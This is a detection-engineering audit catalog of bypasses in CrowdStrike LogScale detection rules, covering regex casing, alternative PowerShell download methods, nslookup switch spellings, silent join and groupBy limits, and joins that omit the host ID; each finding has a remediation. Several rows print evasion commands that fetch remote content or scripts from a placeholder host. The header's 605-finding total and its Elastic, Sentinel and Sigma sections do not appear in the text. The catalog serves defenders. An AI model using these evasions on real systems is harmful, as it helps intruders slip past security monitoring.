# Total Candidate Bugs — Definite Detection-Logic Bypass Findings

A catalog of **605 candidate detection-rule bypass findings** mined from analysis of public detection rulesets (Elastic Security, Microsoft Sentinel, Sigma, CrowdStrike LogScale), mapped to the ADE taxonomy.

> Scope: **only deterministic, attacker-executable bypasses** — high-confidence, material-risk (high/medium) findings an attacker can perform now with existing tools.

**By platform:** Elastic 280 · Sentinel 310 · Sigma 3 · CrowdStrike 12 · **Total 605**

**By subcategory:** [ADE1-01](#ade1-01--substring-manipulation) 2 · [ADE2-01](#ade2-01--methodbinary) 3 · [ADE2-02](#ade2-02--versioning) 13 · [ADE2-03](#ade2-03--locations) 70 · [ADE2-04](#ade2-04--file-types) 47 · [ADE3-02](#ade3-02--aggregation-hijacking) 248 · [ADE3-03](#ade3-03--timing-and-scheduling) 215 · [ADE3-06](#ade3-06--limit-saturation) 5 · [ADE4-04](#ade4-04--field-mismapping--semantics) 2

### Provenance

The Elastic, Sentinel, and Sigma rows are **machine-extracted** and remain unverified against a live backend.

The 12 CrowdStrike rows were produced differently and carry a stronger claim: textual checks generated candidates, then **every row was confirmed by reading the rule source**, and the engine limits cited are quoted from vendor documentation. They are still *static* findings — none has been replayed against a live tenant. Basis: [`CrowdStrike/logscale-community-content`](https://github.com/CrowdStrike/logscale-community-content) @ `0152b8a` (2026-09-15). The checker was validated by confirming it re-finds two independently hand-identified cases before its output was used.

**How the 12 were selected.** The checker emitted 215 candidates across 295 in-scope queries. 111 went to the `ProcessRollup2` cluster below. Of the remainder, most were discarded for one of four reasons: the flagged construct was harmless in context (a case-sensitive regex with no case-bearing literal, or a `sort()` limit made unreachable by a tighter `groupBy()` limit upstream); the defect produced a wrong attribution or a false positive rather than a missed detection; the consequence required a data volume the rule's own group cardinality cannot reach; or the finding duplicated another on a second taxonomy axis. An adversarial re-audit of a 21-row draft withdrew five rows on exactly those grounds, and the reasoning for the substantive withdrawals is recorded in the sections where they sat. The 12 that remain are the ones that survived. **This is a floor, not a ceiling** — the checker only inspected a fixed set of textual patterns, so defect classes it never looked for (bare `=` case sensitivity on attacker-staged paths, path-substring exclusions on attacker-namable directories, `-EncodedCommand` casing) are absent from this catalog rather than absent from the corpus.

**Not counted as findings.** 111 of the 295 in-scope CrowdStrike queries filter `#event_simpleName=ProcessRollup2` without `SyntheticProcessRollup2`, so processes already running when the sensor loaded are not evaluated. This is a real coverage gap, but whether it is a *defect* depends on each query's intent — several deliberately target new executions only — so it is recorded here as a cluster rather than as 111 rows. Two further non-counted clusters are recorded under [ADE3-06](#ade3-06--limit-saturation) and [ADE4-04](#ade4-04--field-mismapping--semantics).

---

## ADE1-01 · Substring Manipulation

2 findings.

| # | Rule | Platform | Risk | MITRE | Affected fields | Bypass | Remediation |
|---|------|----------|------|-------|-----------------|--------|-------------|
| 1 | Example - PowerShell Downloads From a PR2 Event (FLTR package example alert) | CrowdStrike | medium | T1059.001,T1105 | CommandLine | The rule tests binary identity in the wrong field: it requires the literal `powershell.exe` inside the command line (`CommandLine=/powershell\.exe.*DownloadString/i`) rather than on the image path, and the query has no `ImageFileName`/`OriginalFilename` filter at all. Any invocation whose command line omits the extension therefore fails the condition, which includes the ordinary interactive form: `powershell -c "(New-Object Net.WebClient).DownloadString('http://host/p')"`. A fully-qualified launch does put `powershell.exe` in the command line and does match, so the miss is not universal. The same field choice also excludes PowerShell 7 outright, since `pwsh` never contains the matched literal. Command-line content is recorded as supplied rather than normalised (`CommandLine` is documented only as "Full command line"; the case-sensitivity trap in `Gotchas.md` #4 presumes the same preservation). The alert ships `enabled: true`, though it is one of three `Example-*` templates in the package, whose README offers them as "the basis for building custom" content. | Match the executing binary on `ImageFileName` or `OriginalFilename` and keep the command-line regex for the download method only — for example `ImageFileName=/\\(powershell\|pwsh)\.exe$/i` plus a separate `CommandLine` condition. That single change closes the field-semantics defect and the PowerShell 7 gap together. |
| 2 | [T1059.001] NSLookup Remote Payload - Win | CrowdStrike | high | T1059.001 | CommandLine | `CommandLine=/.*\s+\-q\=txt\s+.*/` carries no `/i` flag, so the record-type literal is matched case-sensitively ([LogScale regex flags](https://library.humio.com/crowdstrike-query-language/syntax-regex-flags.html): `i` enables *"case-insensitive searching, matching values regardless of the case of the characters"*). Microsoft documents the record types in upper case — *"TXT: Specifies the text information"* ([nslookup set querytype](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup-set-querytype)) — so the documented spelling is the one the rule misses, and command-line text is recorded as supplied rather than normalised: `nslookup -q=TXT example.com`. | Add the case-insensitive flag to the command-line regex: `CommandLine=/\s-(q\|type\|querytype)=txt(\s\|$)/i`. Treat every regex over attacker-supplied command-line content as needing `/i`. |

## ADE2-01 · Method/Binary

3 findings.

| # | Rule | Platform | Risk | MITRE | Affected fields | Bypass | Remediation |
|---|------|----------|------|-------|-----------------|--------|-------------|
| 1 | [T1059.001] NSLookup Remote Payload - Win | CrowdStrike | high | T1059.001 | CommandLine | The rule matches only `-q=txt`, which is the *undocumented* abbreviation. The form Microsoft actually documents is unmatched: *"To return certain types of records or information, use the `-type=<resourcerecordtype>` option"* ([nslookup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup)), and the equivalence of the two spellings is stated separately — *"This command is the same as the nslookup set type command"* ([nslookup set querytype](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup-set-querytype)). So the rule catches the abbreviation and misses the documented switch: `nslookup -type=txt example.com`. | Cover the spellings in one alternation and tolerate the unique-prefix abbreviations `nslookup` also accepts (`-ty=`, `-quer=`): `CommandLine=/\s-\w*(q\|ty)\w*=txt(\s\|$)/i`. Add a separate branch for the interactive/piped `set type=txt` form, which is not a switch at all. |
| 2 | Example - PowerShell Downloads From a PR2 Event | CrowdStrike | high | T1105 | CommandLine | Only `DownloadString` is enumerated. The same in-scope outcome — retrieving remote content via PowerShell — is reached by several other documented methods the rule does not match, including `DownloadFile`, `DownloadData`, `Invoke-WebRequest` and `Invoke-RestMethod`, and the stable `iwr`/`irm` aliases: `powershell -c "Invoke-WebRequest -Uri http://host/p -OutFile a.ps1"`. (The `curl`/`wget` aliases are Windows PowerShell 5.1 only — PowerShell 6+ removed them, so there `curl` resolves to the real `curl.exe`.) | Enumerate the download surface as an alternation (`DownloadString\|DownloadFile\|DownloadData\|Invoke-WebRequest\|Invoke-RestMethod\|iwr\|irm\|Start-BitsTransfer`), or pivot to a behavioural signal by correlating the PowerShell process with its own `NetworkConnectIP4`/`DnsRequest` events. |
| 3 | [T1059.001] NSLookup Remote Payload - Win | CrowdStrike | medium | T1059.001 | ParentBaseFileName | The rule requires `powershell.exe` as the parent, via bare equality (`ParentBaseFileName=powershell.exe`), which CQL documents as case-sensitive and exact. `nslookup.exe` performing the same TXT-record retrieval under any other parent is out of reach — `cmd.exe`, `wscript.exe`, a scheduled task, a service host — and that set includes PowerShell 7 itself, since Microsoft renamed the binary: *"The binary name for PowerShell has been changed from powershell(.exe) to pwsh(.exe)"* ([differences from Windows PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)). | Detect the `nslookup` TXT behaviour independently of the parent, and treat the parent as triage context rather than a matching condition. Where a parent set is genuinely required, enumerate the script-host and shell surface with a case-insensitive regex — `ParentBaseFileName=/^(powershell\|pwsh\|cmd\|wscript\|cscript\|mshta)\.exe$/i` — rather than pinning one binary by exact string. |

## ADE3-06 · Limit Saturation

5 findings.

Every row here rests on a limit stated in LogScale's own function documentation. These operators truncate without raising an error, so a rule whose needed record falls outside the budget returns no match and the scheduled run reports nothing unusual. Where a row's consequence additionally depends on data volume, that precondition is stated in the row rather than assumed.

| # | Rule | Platform | Risk | MITRE | Affected fields | Bypass | Remediation |
|---|------|----------|------|-------|-----------------|--------|-------------|
| 1 | Process Events - DNS Requests From Processes | CrowdStrike | high | T1071.004 | TargetProcessId,ContextProcessId,DomainName | Two limits bite in the same `join()`. The subquery is every `DnsRequest` event in the estate over a 7-day saved window, set to `limit=200000` — the documented hard maximum, so there is no headroom left ([LogScale `join()`](https://library.humio.com/crowdstrike-query-language/functions-join.html): `limit` default `100000`, **Maximum** `200000`). `DnsRequest` is among the highest-volume Falcon event types, so in a production estate the subquery truncates and the resolutions being hunted can be absent from the retained set. Separately the call omits `max=`, which defaults to `1`: *"If a subquery has multiple events with the same join key, then up to max rows are emitted."* A process that resolves many names therefore contributes one `DomainName`, collapsing the one-process-many-lookups pattern the query exists to reveal. | Invert the correlation so the bounded side holds the selective set: make the process filter the subquery and stream `DnsRequest` as the primary. Narrow the subquery toward the rule's intent instead of accepting all DNS, shorten the window, and set `max=` to the number of correlated events worth keeping per process. For same-stream correlation prefer `selfJoinFilter()` with `groupBy()` and `collect()`, which retains every matching event per key. |
| 2 | Hunt PBD File Paths in Reflective .net Module Loads | CrowdStrike | high | T1620 | FileName,FilePath,uniqueEndpoints,executionCount | `groupBy([FileName, FilePath], ...)` carries no `limit`, so it runs at the 20,000-group default (`GroupDefaultLimit`) and retains the top-N: *"The selection is based on the aggregate numerical output across all specified functions and all time buckets, not the series identifiers themselves"* ([LogScale `groupBy()`](https://library.humio.com/crowdstrike-query-language/functions-groupby.html)). Three rarity gates follow — `test(uniqueEndpoints<5)`, `test(uniqueManagedPdbBuildPath<10)`, `test(executionCount<100)`. The numeric aggregates here are the three `count()` outputs, so ranking tracks those counts and the low-count groups the gates select for rank last. Above 20,000 distinct name/path pairs, a module seen on a handful of endpoints can be evicted before it is ever tested, and the documentation notes `count` becomes *"a lower bound estimate"* at the limit. | Add `limit=max` to the `groupBy()`. Reduce grouping cardinality first so the group count stays inside the ceiling, and keep rarity gates ahead of any limit that evicts by value. |
| 3 | 'Suspicious activity: ePHI moved/copied to unencrypted removable media' (Tausight ePHI pack) | CrowdStrike | medium | T1052 | UserName,FileName | `groupBy([UserName], function=count(field=FileName, as="Files"), limit=10)` caps the aggregation at ten groups, retained by highest value, and the rule then tests `Files>=1`. The threshold is unreachable for any user outside the ten heaviest copiers in the one-hour window, and a single-file copy ranks lowest. The alert ships `enabled: true`. **Precondition:** the gap only opens once more than ten distinct users move ePHI to removable media inside that hour, so this is estate-dependent rather than deterministic — hence medium. The rule is a Tausight vendor-pack alert distributed inside CrowdStrike's community repo; it queries `$tausight/ephi-risk-posture:*` functions, not Falcon telemetry. | Remove `limit=10`, or raise it to `limit=max`. A group limit numerically far above the alert threshold is the only safe configuration. Three sibling alerts in the same pack carry the identical construct (see the note below this table). |
| 4 | Process Events - Identify Low Port Bindings | CrowdStrike | medium | T1571 | TargetProcessId,ContextProcessId,LocalPort | The `join()` subquery returns every `NetworkListenIP4` event with `LocalPort<1024` across the estate over a 7-day window at `limit=200000`, the documented maximum, so the ceiling cannot be raised further ([LogScale `join()`](https://library.humio.com/crowdstrike-query-language/functions-join.html)). Past that point listener events are dropped silently. `max=` is also left at its default of `1`, so a process bound to several privileged ports reports only one. | Invert so the process filter is the subquery and the listener stream is primary; narrow the subquery to the ports or processes of interest; set `max=` explicitly. |
| 5 | Firewall Rule Additions | CrowdStrike | medium | T1562.004 | TargetProcessId,ContextProcessId,FirewallRule | The `join()` specifies no `limit`, so the `FirewallSetRule` subquery runs at the documented default of `100000` rows, and no `max=`, so it keeps one subquery row per join key. A process that adds multiple firewall rules — the pattern that matters for this technique — surfaces only one of them, and in a large estate over a long window the subquery can itself exceed the row cap. | Set `limit=` toward the ceiling and `max=` above 1, or restructure with `selfJoinFilter()` plus `groupBy()` and `collect()` so every rule added by a process is retained. |

**Not counted — three sibling alerts, same defect as row 3.** `Compliance violations: Unencrypted laptop device with ePHI`, `Vulnerabilities: creator/owner with excessive number of ePHI files`, and `Vulnerabilities: creator/owner with excessive number of stale/unused ePHI files` (all under `Log-Sources/Tausight/src/alerts/`) each pair a `groupBy(..., limit=10)` with a low threshold. They are recorded here rather than as rows because they are the same defect in the same vendor pack, and because the two `Vulnerabilities:` alerts are posture census reports whose truncation is a reporting-completeness problem, not something an attacker triggers.

**Withdrawn during verification.** An earlier revision of this section carried two further rows that did not survive checking, and they are named here so the reasoning is on record. One claimed the four Tausight alerts ending in an unbounded `sort()` were truncated at the documented 200-row default; in every one of them a `groupBy(..., limit=10)` feeds the `sort()` directly, so at most ten rows ever reach it and the default is structurally unreachable. The other claimed a rarity filter in `Falcon Authentication from Unexpected GeoHash` lost its low-count groups to the 20,000-group default; the group key is `[UserId, geoHash]` over Falcon console API authentications with `geohash(precision=2)`, which yields at most 32² = 1024 cells, so the group ceiling is bounded near (console identities × 1024) and 20,000 is not reachable in a real tenant.

## ADE4-04 · Field Mismapping & Semantics

2 findings.

Falcon sensor process IDs are scoped to the sensor that emitted them, so a correlation keyed on the process ID alone can pair events from different hosts. CrowdStrike's own community content shows the correct form — both [ISO/IMG Written to Disk w/ Responsible Process](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/ISO_IMG%20Written%20to%20Disk%20w_%20Responsible%20Process.md) and the [ProxyNotShell query](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Queries/%5BCVE-2022-41082%5D%20ProxyNotShell%20Exchange%20Vulnerability.logscale) join on `field=[aid, TargetProcessId], key=[aid, ContextProcessId]`.

**A missing `aid` does not by itself cause a false negative.** In `mode=inner` the join *"lets the events through that match on the join keys"*, so a colliding process ID normally displaces only the enriched value: the primary event still passes and still groups under its own `aid`. The result is a wrong attribution, and sometimes a false positive. The collision becomes a **miss** only where a later stage filters on a field taken from the subquery — then the wrong host's value fails the filter and the genuine event is dropped. The two rows below are the cases where that post-join filter exists; the four rules where it does not are recorded in the note beneath the table.

| # | Rule | Platform | Risk | MITRE | Affected fields | Bypass | Remediation |
|---|------|----------|------|-------|-----------------|--------|-------------|
| 1 | Process Events - DNS Requests From Processes | CrowdStrike | high | T1071.004 | TargetProcessId,ContextProcessId,DomainName | `join(..., field=TargetProcessId, key=ContextProcessId, include=[DomainName])` omits `aid`, and `max=` defaults to `1`, so one `DnsRequest` row is kept per colliding process ID. The join is followed by `\| DomainName=/\./ DomainName!=/(_\|\.arpa\.$)/`, which tests the **enriched** `DomainName`. When a process on one host collides with a process on another and the retained row supplies a domain that fails those tests, the genuine process/DNS pairing is filtered out after the join rather than merely mislabelled. | Join on the composite key — `field=[aid, TargetProcessId], key=[aid, ContextProcessId]` — as CrowdStrike's own ISO/IMG and ProxyNotShell queries do, and raise `max=` so a single collision cannot displace the correct row. |
| 2 | Process Events - Identify Low Port Bindings | CrowdStrike | high | T1571 | TargetProcessId,ContextProcessId,LocalAddressIP4,LocalPort | The listener-to-process `join()` omits `aid` with `max=` at its default of `1`. The join is followed by `\| LocalAddressIP4=* \| LocalAddressIP4!=/^127\./ \| LocalPort=* \| FileName=*`, every one of which tests a field taken from the subquery. A collision that supplies a loopback address or an absent port drops the real privileged-port binding at those filters instead of reporting it against the wrong host. | Add `aid` to both sides of the join key and set `max=` explicitly, so the retained listener row always belongs to the same endpoint as the process. |

**Not counted — four rules omit `aid` without a resulting miss.** `Process Events - Connections to Suspicious Countries`, `DNS Events - Java Generating DNS Requests`, `Process Events - User Account Creation by Process`, and `Firewall Rule Additions` all key their correlation on the process ID alone, but none filters on an enriched field afterwards. A collision there yields a wrong attribution — another host's command line, country, or account against the reported process — and in the Java case a non-Java process can be reported as Java-generated DNS, which is a false positive. Those are correctness defects worth fixing with the same composite-key change, but they are not in-scope activity the rule fails to surface, so they are not counted as findings in a false-negative catalog.
